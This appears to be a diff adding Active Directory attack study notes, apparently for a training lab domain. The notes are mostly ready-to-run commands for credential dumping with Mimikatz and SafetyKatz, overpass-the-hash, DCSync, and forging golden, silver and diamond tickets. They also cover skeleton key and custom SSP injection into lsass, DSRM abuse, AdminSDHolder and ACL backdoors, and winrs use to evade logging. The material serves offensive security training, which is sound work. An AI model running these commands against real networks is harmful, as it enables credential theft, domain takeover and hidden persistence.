+<li><strong>winPEAS</strong> <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">GitHub</a></li>
+</ul></li>
+</ul>
+
+<h5>🛠️ Local Privilege Escalation Commands</h5>
+
+<strong>Services Issues</strong> using <strong>PowerUp</strong><br />
+- Get services with unquoted paths and a space in their name.<br />
+  <pre><code>Get-ServiceUnquoted -Verbose
+  </code></pre><br />
+- Get services where the current user can write to its binary path or change arguments to the binary<br />
+  <pre><code>Get-ModifiableServiceFile -Verbose
+  </code></pre><br />
+- Get the services whose configuration current user can modify.<br />
+  <pre><code>Get-ModifiableService -Verbose
+  </code></pre><br />
+Run <strong>all checks</strong> from:<br />
+- PowerUp<br />
+  <pre><code>Invoke-AllChecks 
+  </code></pre><br />
+- Privesc:<br />
+  <pre><code>Invoke-PrivEscCheck 
+  </code></pre><br />
+- PEASS-ng:<br />
+  <pre><code>winPEASx64.exe
+  </code></pre>
+
+<hr />
+
+<h4>🧨 Feature Abuse</h4>
+
+Features abuse are awesome as there are seldom patches for them and they are not the focus of security teams!
+
+One of the favorite features abuse is targeting enterprise applications which are not built keeping security in mind.
+
+ℹ️ On Windows, many enterprise applications need either Administrative privileges or SYSTEM privileges making them a great avenue for privilege escalation.
+
+<h5>⚙️ Jenkins</h5>
+
+Jenkins is a widely used Continuous Integration tool.
+
+Apart from numerous plugins, there are two ways of <strong>executing commands</strong> on a Jenkins Master.
+
+1) If you have Admin access (default installation before 2.x), go to http://<jenkins_server>/script<br />
+    +  In the script console, Groovy scripts could be executed.<br />
+       <pre><code>def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = '[INSERT COMMAND]'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out&gt; $sout err&gt; $serr"
+       </code></pre><br />
+2) If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add <strong>"Execute Windows Batch Command"</strong> and enter:<br />
+   <pre><code>powershell -c &lt;command&gt;
+
+<h2>   </code></pre></h2>
+
+<h4>🔁 Relaying Attack</h4>
+
+In a relaying attack, the target <strong>credentials are not captured</strong>. Instead, they are <strong>forwarded</strong> to a local or remote service or an endpoint for authentication.
+
+Two types based on authentication:<br />
+1) <strong>NTLM relaying</strong><br />
+2) <strong>Kerberos relaying</strong>
+
+ℹ️ Common targets: LDAP and Active Directory Certificate Services (AD CS).
+
+<h5>🔄 Comparison Table</h5>
+
+<table>
+<thead>
+<tr>
+  <th>Attack Type</th>
+  <th>What It Uses</th>
+  <th>Needs User Password?</th>
+  <th>Key Difference</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Pass-the-Hash</td>
+  <td>NTLM hash (password hash)</td>
+  <td>❌ No</td>
+  <td>Reuses a captured NTLM hash to authenticate</td>
+</tr>
+<tr>
+  <td>Pass-the-Ticket</td>
+  <td>Kerberos TGT or service ticket</td>
+  <td>❌ No</td>
+  <td>Reuses a captured Kerberos ticket (like a token)</td>
+</tr>
+<tr>
+  <td>Relaying Attack</td>
+  <td>Live authentication request</td>
+  <td>❌ No</td>
+  <td>Forwards a real-time login to another system</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h5>🧠 Think of it like:</h5>
+
+<ul>
+<li><strong>Pass-the-Hash</strong> = “I stole your badge and used it.”  </li>
+<li><strong>Pass-the-Ticket</strong> = “I copied your digital keycard and used it.”  </li>
+<li><strong>Relaying</strong> = “I grabbed your keycard while you were using it and used it at the same time somewhere else.”</li>
+</ul>
+
+<hr />
+
+<h4>🗂️ GPO Abuse</h4>
+
+A GPO with overly permissive ACL can be abused for multiple attacks.
+
+<h5>⚠️ GPOddity</h5>
+
+<strong>GPOddity</strong> combines NTLM relaying and modification of Group Policy Container.
+
+By relaying credentials of a user who has WriteDACL on GPO, we can modify the path (gPCFileSysPath) of the group policy template (default is SYSVOL).
+
+ℹ️ This enables loading of a malicious template from a location that we control.
+
+<img src="img\GPOddity.png" alt="GPOddity" />
+</details><hr />
+<details>
+<summary>🕵️ Lateral Movement
+</summary>
+<details>
+<summary>🔌 PowerShell Remoting
+</summary>Think of <strong>PowerShell Remoting (PSRemoting)</strong> as <strong>psexec</strong> on steroids but much more silent and super fast!
+
+ℹ️ <strong>PSRemoting</strong> uses <strong>Windows Remote Management (WinRM)</strong> which is Microsoft's implementation of WS-Management. 
+
+<ul>
+<li>Enabled by default on <strong>Server 2012</strong> onwards with a firewall exception. </li>
+<li>Uses <strong>WinRM</strong> and listens by default on <strong>5985 (HTTP)</strong> and <strong>5986 (HTTPS)</strong>.</li>
+<li>It is the recommended way to manage Windows Core servers.</li>
+<li>The remoting process runs as a <span style="color:red;"><strong>high integrity</strong></span> process. That is, you get an elevated shell.</li>
+</ul>
+
+<hr />
+
+1) <strong>One-to-One</strong>
+
+<pre><code> PSSession
+  - Interactive
+  - Runs in a new process (wsmprovhost)
+  - Is Stateful
+
+ Useful cmdlets
+  &lt;pre&gt;&lt;code&gt;New-PSSession
+Enter-PSSession
+  &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+
+1) <strong>One-to-Many</strong>
+
+<pre><code> Also known as Fan-out remoting
+ - Non-interactive.
+ - Executes commands parallely.
+
+ Useful cmdlets 
+ &lt;pre&gt;&lt;code&gt;Invoke-Command
+ &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+
+<hr />
+
+#### 💉 PowerShell Remoting Commands
+
+<ul>
+<li>Use below to execute commands or scriptblocks:<br />
+<pre><code>Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content &lt;list_of_servers&gt;)
+</code></pre></li>
+<li>Use below to execute scripts from files<br />
+<pre><code>Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content &lt;list_of_servers&gt;)
+</code></pre></li>
+<li>Use below to execute locally loaded function on the remote machines:<br />
+<pre><code>Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content &lt;list_of_servers&gt;)
+</code></pre></li>
+<li>In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:<br />
+<pre><code>Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content &lt;list_of_servers&gt;) -ArgumentList
+</code></pre></li>
+<li>Use below to execute "Stateful" commands using <code>Invoke-Command</code>:<br />
+<pre><code>$Sess = New-PSSession -Computername Server1
+Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
+</code></pre></li>
+</ul>
+
+<hr />
+
+#### 🙈 PowerShell Remoting Defence Evasion 
+
+ℹ️ PowerShell remoting supports the system-wide transcripts and deep script block logging. 
+
+We can use <strong>winrs</strong> in place of <strong>PSRemoting</strong> to evade the logging (and still reap the benefit of <strong>5985</strong> allowed between hosts):<br />
+  <pre><code>winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname 
+  </code></pre>
+
+ℹ️ We can also use <strong>winrm.vbs</strong> and <strong>COM</strong> objects of WSMan object - <a href="https://github.com/bohops/WSMan-WinRM">GitHub</a>
+
+<hr />
+</details>
+<details>
+<summary>🪪 Credential Extraction 
+</summary><strong>Local Security Authority (LSA)</strong> is responsible for authentication on a Windows machine. <strong>Local Security Authority Subsystem Service (LSASS)</strong> is its <strong>service</strong>. 
+
+ℹ️ LSASS stores credentials in multiple forms - <strong>NT hash</strong>, <strong>AES</strong>, <strong>Kerberos tickets</strong> and so on.
+
+Credentials are stored by LSASS when a user:<br />
+  - Logs on to a local session or RDP<br />
+  - Uses <code>RunAs</code><br />
+  - Run a Windows service<br />
+  - Runs a scheduled task or batch job<br />
+  - Uses a Remote Administration tool
+
+ℹ️  LSASS is the most <strong>monitored</strong> process on a Windows machine.
+
+Some of the credentials that can be extracted without touching LSASS<br />
+  - <strong>SAM</strong> hive (<span style="color:#FE8925;"><strong>Registry</strong></span>) - Local credentials<br />
+  - <strong>LSA</strong> Secrets/SECURITY hive (<span style="color:#FE8925;"><strong>Registry</strong></span>) - Service account passwords, Domain cached credentials etc.<br />
+  - <strong>DPAPI</strong> Protected Credentials (<span style="color:#FE8925;"><strong>Disk</strong></span>) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.
+
+#### 🐈 Mimikatz Commands
+
+mimikatz can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting attacks!
+
+ℹ️ There are multiple tools that implement mimikatz full or partial mimikatz features.
+
+<ul>
+<li>Dump credentials on a using Mimikatz.<br />
+<pre><code>mimikatz.exe -Command '"sekurlsa::ekeys"' 
+</code></pre></li>
+<li>Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)<br />
+<pre><code>SafetyKatz.exe "sekurlsa::ekeys" 
+</code></pre></li>
+<li>From a Linux attacking machine using <code>impacket</code>.
+
+ℹ️ <code>Impacket</code> is a <strong>Python library</strong> with tools for <strong>remote</strong> Windows exploitation over SMB/RPC/WinRM/etc.</li>
+</ul>
+
+<hr />
+</details>
+<details>
+<summary>🛂 OverPass-The-Hash 
+</summary><ul>
+<li><strong>Over Pass the hash (OPTH)</strong> generate tokens from hashes or keys. Needs elevation (<strong>Run as administrator</strong>)
+
+<pre><code>SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:&lt;aes256keys&gt; /run:cmd.exe" "exit" 
+</code></pre>
+
+ℹ️ The above commands starts a process with a logon type 9 (same as <code>runas /netonly</code>). </li>
+<li><strong>Over Pass the hash (OPTH)</strong> generate tokens from hashes or keys (<strong>doesn't need elevation</strong>)
+
+<pre><code> Rubeus.exe asktgt /user:administrator /rc4:&lt;ntlmhash&gt; /ptt
+</code></pre></li>
+<li>Below command needs elevation
+
+<pre><code> Rubeus.exe asktgt /user:administrator /aes256:&lt;aes256keys&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre></li>
+</ul>
+
+<hr />
+</details>
+<details>
+<summary>🧬 DCSync 
+</summary>To extract credentials from the DC <strong>without code execution</strong> on it, we can use DCSync. 
+
+<ul>
+<li>To use the DCSync feature for getting <strong>krbtgt hash</strong> execute the below command with DA privileges for dcorp domain:<br />
+  <pre><code>SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+  </code></pre>
+
+ℹ️ By default, <strong>Domain Admins</strong>, <strong>Enterprise Admins</strong> or <strong>Domain Controller privileges</strong> are required to run <strong>DCSync</strong>.</li>
+</ul>
+</details>
+</details><hr />
+<details>
+<summary>♾️ Persistence
+</summary><h3>👑 AD Domain Dominance</h3>
+
+Domain Dominance refers to an attacker gaining control of the Active Directory domain, essentially becoming the "master" of the network. This allows them to manage users, computers, and resources, including the ability to modify security settings, deploy malware, and potentially steal sensitive data. 
+
+ℹ️ There is much more to Active Directory than "just" the Domain Admin.
+
+<hr />
+
+<h3>🔐 Kerberos</h3>
+
+Kerberos is the basis of authentication in a Windows Active Directory environment.
+
+Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials.!
+
+ℹ️ Therefore, Kerberos is understandably a very interesting target of abuse!
+
+<img src="img/KDC.png" alt="Kerberos Auth Life Cycile" />
+
+<hr />
+
+
+<details>
+<summary>🎫 Golden Ticket
+</summary>A golden ticket is signed and encrypted by the hash of <strong>krbtgt</strong> account which makes it a valid <strong>TGT ticket</strong>.
+
+The <strong>krbtgt user hash</strong> could be used to <span style="color:red;"><strong>impersonate</strong></span>  any user with any privileges from <strong>even a non-domain machine</strong>.
+
+ℹ️ As a good practice, it is recommended to change the password of the krbtgt account <strong>twice</strong> as password history is maintained for the account. 
+
+<img src="img/Golden-Ticket.png" alt="Golden Ticket" />
+
+#### 🔪 Commands 
+
+1) Execute mimikatz (or a variant) on DC as DA to get krbtgt hash<br />
+     <pre><code>C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'<br />
+     </code></pre>
+
+<pre><code> Or To use the **DCSync** feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
+ &lt;pre&gt;&lt;code&gt;C:\AD\Tools\SafetyKatz.exe  "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+ &lt;/code&gt;&lt;/pre&gt;
+ ℹ️ Using the DCSync option needs **no code execution on the target DC**.
+</code></pre>
+
+2)  Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:<br />
+      <pre><code>C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd <br />
+      </code></pre><br />
+      - Above command generates the ticket forging command.<br />
+        Note that 3 LDAP queries are sent to the DC to retrieve the values:<br />
+        1. To retrieve flags for user specified in /user.<br />
+        2. To retrieve /groups, /pgid, /minpassage and /maxpassage<br />
+        3. To retrieve /netbios of the current domain
+
+<pre><code>   If you have already enumerated the above values, manually specify as many you can  in the forging command (a bit more opsec friendly).
+</code></pre>
+
+3) The Golden ticket forging command looks like this:<br />
+     <pre><code>C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-37263689483917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORPDC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt<br />
+     </code></pre>
+
+<pre><code> ℹ️ This command is far more comprehensive, aiming for higher authenticity and immediate usability. Besides the core details, it specifies numerous attributes to make the forged ticket appear more **legitimate**.
+
+
+ ![Rubeus - Golden Ticket](img/R-Golden-Ticket.png)
+ ![Rubeus - Golden Ticket](img/R-Golden-Ticket2.png)
+</code></pre>
+</details><hr />
+
+
+<details>
+<summary>🥈 Silver Ticket
+</summary><ul>
+<li>A valid Service Ticket or TGS ticket (Golden ticket is TGT).</li>
+<li>Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.</li>
+<li>Services rarely check PAC (Privileged Attribute Certificate). </li>
+<li>Services will allow access only to the services themselves.</li>
+<li>Reasonable persistence period (default 30 days for computer accounts).
+
+<img src="img/Silver-Ticket.png" alt="Silver Ticket" />
+
+<h4>🔪 Commands</h4>
+
+Forge a Silver ticket:
+
+<pre><code>C:\AD\Tools\Rubeus.exe silver /service:http/dcorpdc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+</code></pre>
+
+ℹ️ this <span style="color:red;"><strong>RC4</strong></span> is for the target machine account (Like <strong>MyComputer$</strong>)</li>
+<li>Just like the Golden ticket, /ldap option queries DC for information related to the user.</li>
+<li>Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.</li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>💎 Diamond Ticket
+</summary>A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account. 
+
+<strong>Golden ticket</strong> was a <span style="color:red;"><strong>TGT forging</strong></span> attacks whereas <strong>diamond ticket</strong> is a <span style="color:red;"><strong>TGT modification</strong></span> attack. 
+
+A diamond ticket is more opsec safe as it has:<br />
+  - Valid ticket times because a TGT issued by the DC is modified<br />
+  - In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.
+
+<img src="img/Diamond-Ticket.png" alt="Diamond Ticket" />
+
+#### 🔪 Commands 
+
+<ul>
+<li>We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):<br />
+ <pre><code>Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt <br />
+ </code></pre></li>
+<li>We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
+
+<pre><code>Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorpdc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🦴 Skeleton Key
+</summary>It involves <strong>patching</strong> the <code>lsass.exe</code> process on a <strong>Domain Controller (DC)</strong> to allow any user to authenticate with a pre-defined, <strong>universal password</strong> 
+
+ℹ️ <span style="color:red;"><strong>NOT</strong></span> persistent across <strong>reboots</strong>
+
+#### 🔪 Commands 
+
+1) Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. <strong>DA privileges required</strong><br />
+     <pre><code>SafetyKatz.exe '"privilege::debug" "misc::skeleton"' ComputerName dcorp-dc.dollarcorp.moneycorp.local<br />
+     </code></pre><br />
+  2) Now, it is possible to access any machine with a valid username and password as "mimikatz"<br />
+     <pre><code>Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator<br />
+     </code></pre>
+
+<pre><code> ℹ️ Note that Skeleton Key is &lt;span style="color:red;"&gt;**NOT**&lt;/span&gt; **opsec safe** and is also known to cause **issues** with **AD CS**.
+</code></pre>
+
+<hr />
+
+<ul>
+<li>In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver <code>mimidriv.sys</code> on disk of the target DC:<br />
+<pre><code> mimikatz # privilege::debug
+ mimikatz # !+
+ mimikatz # !processprotect /process:lsass.exe /remove
+ mimikatz # misc::skeleton
+ mimikatz # !-
+</code></pre><br />
+ℹ️ Note that above would be very <span style="color:red;"><strong>noisy</strong></span> in logs - Service installation <code>Kernel mode driver</code></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🔁 Directory Services Restore Mode (DSRM)
+</summary>There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
+
+DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. 
+
+After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
+
+<img src="img/DSRM.png" alt="DSRM" />
+
+#### 🔪 Commands
+
+1) <code>Dump</code> DSRM password (needs DA privs)<br />
+     <pre><code>SafetyKatz.exe "token::elevate" "lsadump::sam"<br />
+     </code></pre><br />
+  2) Compare the Administrator hash with the Administrator hash of below command<br />
+     <pre><code>SafetyKatz.exe "lsadump::lsa /patch"<br />
+     </code></pre>
+
+ℹ️ First one is the DSRM local Administrator.
+
+<ul>
+<li>Since it is the local administrator of the DC, we can pass the hash to authenticate. </li>
+<li>But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash<br />
+  <pre><code>winrs -r:dcorp-dc cmd 
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+  </code></pre>
+
+3) Use below commands to <code>Pass-the-hash</code> of DSRM administrator and access the DC:<br />
+   <pre><code>SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
+
+Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
+
+Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential 
+<br />
+   </code></pre></li>
+</ul>
+</details><hr />
+
+
+<details>
+<summary>🧩 Custom SSP
+</summary>A <strong>Security Support Provider (SSP)</strong> is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:<br />
+  - NTLM<br />
+  - Kerberos<br />
+  - Wdigest<br />
+  - CredSSP
+
+<strong>Mimikatz</strong> provides a custom SSP - <code>mimilib.dll</code>. This SSP logs local logons, service account and machine account <strong>passwords</strong> in <strong>clear text</strong> on the target server.
+
+#### 🔪 Commands
+
+We can use either of the ways:<br />
+  - Drop the mimilib.dll to system32 and add mimilib to  <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code><br />
+    <pre><code> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+ $packages += "mimilib"
+ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages <br />
+    </code></pre><br />
+  - Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable)<br />
+    <pre><code>SafetyKatz.exe -Command '"misc::memssp"'<br />
+    </code></pre>
+
+<strong>All local logons on the DC are logged to</strong> <code>C:\Windows\system32\mimilsa.log</code>
+
+<img src="img/mimilsa.png" alt="mimilsa.dll" />
+</details><hr />
+
+<h3>Persistence using ACLs 📃</h3>
+
+
+<details>
+<summary>🧱 AdminSDHolder
+</summary><strong>AdminSDHolder</strong> is a template object in <strong>Active Directory's System container</strong> that defines the default permissions for <strong>Protected Groups</strong> (e.g., Domain Admins). Every hour, <strong>SDPROP (Security Descriptor Propagator)</strong> compares the ACLs of these protected groups and their members to AdminSDHolder's ACL, overwriting any differences to enforce consistent security.
+
+<table>
+<thead>
+<tr>
+  <th>Protected Groups</th>
+  <th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Account Operators</td>
+  <td>Enterprise Admins</td>
+</tr>
+<tr>
+  <td>Backup Operators</td>
+  <td>Domain Controllers</td>
+</tr>
+<tr>
+  <td>Server Operators</td>
+  <td>Read-only Domain Controllers</td>
+</tr>
+<tr>
+  <td>Print Operators</td>
+  <td>Schema Admins</td>
+</tr>
+<tr>
+  <td>Domain Admins</td>
+  <td>Administrators</td>
+</tr>
+<tr>
+  <td>Replicator</td>
+  <td></td>
+</tr>
+</tbody>
+</table>
+
+Well known <strong>abuse</strong> of some of the <strong>Protected Groups</strong> 
+
+ℹ️ All of the below can log on locally to DC
+
+<table>
+<thead>
+<tr>
+  <th>Protected Group</th>
+  <th>Known Abuse</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>Account Operators</td>
+  <td>Cannot modify DA/EA/BA groups. Can modify nested group within these groups.</td>
+</tr>
+<tr>
+  <td>Backup Operators</td>
+  <td>Backup GPO, edit to add SID of controlled account to a privileged group and Restore.</td>
+</tr>
+<tr>
+  <td>Server Operators</td>
+  <td>Run a command as SYSTEM (using the disabled Browser service).</td>
+</tr>
+<tr>
+  <td>Print Operators</td>
+  <td>Copy <code>ntds.dit</code> backup, load device drivers.</td>
+</tr>
+</tbody>
+</table>
+
+With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a <strong>backdoor/persistence</strong> mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. 
+
+ℹ️ In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it. 
+
+#### 🔪 Commands
+
+1) Add FullControl permissions for a user to the AdminSDHolder as DA<br />
+     - PowerView<br />
+       <pre><code> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose 
+       </code></pre><br />
+     - ActiveDirectory
+
+<pre><code>   [GitHub - RACE](https://github.com/samratashok/RACE)
+   &lt;pre&gt;&lt;code&gt;Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
+   &lt;/code&gt;&lt;/pre&gt;
+</code></pre>
+
+2) Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:<br />
+     - PowerView<br />
+       <pre><code>Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc al' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose 
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose 
+       </code></pre>
+
+3) Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory<br />
+     <pre><code>Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose <br />
+     </code></pre><br />
+     - For pre-Server 2008 machines<br />
+       <pre><code>Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose 
+       </code></pre>
+
+4) Check the Domain Admins permission as normal user<br />
+     - PowerView<br />
+       <pre><code>Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+       </code></pre><br />
+     - ActiveDirectory<br />
+       <pre><code>(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}  
+       </code></pre>
+
+5) Abusing FullControl<br />
+     - PowerView<br />
+       <pre><code>Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+       </code></pre><br />
+     - ActiveDirectory<br />
+       <pre><code>Add-ADGroupMember -Identity 'Domain Admins' -Members testda
+       </code></pre>
+
+6) Abusing ResetPassword<br />
+     - PowerView<br />
+       <pre><code>Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose  
+       </code></pre><br />
+     - ActiveDirectory<br />
+       <pre><code>Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+       </code></pre>
+</details><hr />
+
+
+<details>
+<summary>📎 Rights Abuse
+</summary>with DA privileges, the ACL for the <strong>domain root</strong> can be modified to provide useful rights like <strong>FullControl</strong> or the ability to run "<strong>DCSync</strong>".
+
+#### 🔪 Commands
+
+1) Add FullControl rights<br />
+     <pre><code>Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose <br />
+     </code></pre><br />
+     - Using <strong>ActiveDirectory</strong> Module and <strong>RACE</strong><br />
+       <pre><code>Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose 
+       </code></pre>
+
+2) Add rights for DCSync<br />
+     <pre><code>Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose <br />
+     </code></pre><br />
+     - Using <strong>ActiveDirectory</strong> Module and <strong>RACE</strong><br />
+       <pre><code>Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose 
+       </code></pre>
+
+### ⚠️ Execute DCSync<br />
+  <pre><code>Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+  </code></pre><br />
+   <strong>OR</strong><br />
+  <pre><code>C:\AD\Tools\SafetyKatz.exe  "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
+  </code></pre>
+</details><hr />
+
+
+<details>
+<summary>🌵 Security Descriptors
+</summary>It is possible to modify <strong>Security Descriptors</strong> (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. 
+
+ℹ️ <strong>Administrative</strong> privileges are required for this.
+
+<strong>Security Descriptor Definition Language</strong> defines the format which is used to describe a security descriptor. <strong>SDDL</strong> uses <strong>ACE strings</strong> for <strong>DACL</strong> and <strong>SACL</strong>:
+
+<code>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</code>
+
+ACE for built-in <strong>administrators</strong> for <strong>WMI</strong> namespaces 
+
+<code>A;CI;CCDCLCSWRPWPRCWD;;;SID</code>
+
+<ul>
+<li><strong>A</strong>: Allow</li>
+<li><strong>CI</strong>: Container Inherit</li>
+<li><strong>CCDCLCSWRPWPRCWD</strong>: Rights granted</li>
+<li><strong>SID</strong>: Security Identifier of the user/group
+
+<h3>WMI</h3>
+
+ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:
+
+<code>C:\AD\Tools\RACE-master\RACE.ps1</code>
+
+1)  On <strong>local machine</strong> for student1:<br />
+    <pre><code>Set-RemoteWMI -SamAccountName student1 -Verbose <br />
+    </code></pre><br />
+2)  On <strong>remote machine</strong> for student1 without explicit credentials:<br />
+    <pre><code>Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose <br />
+    </code></pre><br />
+3)  On <strong>remote machine</strong> with explicit credentials. Only root\cimv2 and nested namespaces:<br />
